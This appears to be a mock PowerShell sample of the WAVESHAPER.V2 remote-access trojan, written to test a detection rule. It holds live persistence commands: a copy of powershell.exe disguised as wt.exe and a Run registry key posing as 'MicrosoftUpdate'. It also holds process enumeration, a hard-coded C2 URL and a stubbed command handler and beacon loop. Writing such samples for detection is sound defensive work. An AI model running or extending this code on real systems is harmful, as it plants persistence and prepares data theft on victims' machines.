# Mock WAVESHAPER.V2 Windows RAT — tests Axios_WAVESHAPER_RAT
# Reconstructed from Microsoft and hunt.io analyses

$UA = "mozilla/4.0 (compatible; msie 8.0; windows nt 5.1; trident/4.0)"
$C2 = "http://sfrclak.com:8000/6202033"
$RunKey = "MicrosoftUpdate"

# Persistence: copy PowerShell to wt.exe, register Run key
Copy-Item "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe" "$env:PROGRAMDATA\wt.exe"
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $RunKey -Value "$env:PROGRAMDATA\system.bat"

# Beacon types
$msgType = "FirstInfo"  # Initial enumeration
# $msgType = "BaseInfo"  # Heartbeat (60s interval)
# $msgType = "CmdResult" # Command response

# System enumeration
$sysInfo = Get-WmiObject Win32_Process | Select-Object ProcessId, Name

# Command handler
function Handle-Command($cmd) {
    switch ($cmd) {
        "kill"      { exit }
        "peinject"  { <# binary injection #> }
        "runscript" { <# script execution #> }
        "rundir"    { <# filesystem browsing #> }
    }
    # Status responses: "Wow" = success, "Zzz" = failure
    return "Wow"
}

# Beacon loop — powershell -w hidden -ep bypass
while ($true) {
    $body = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes(($sysInfo | ConvertTo-Json)))
    # POST to C2 with User-Agent
    Start-Sleep -Seconds 60
}
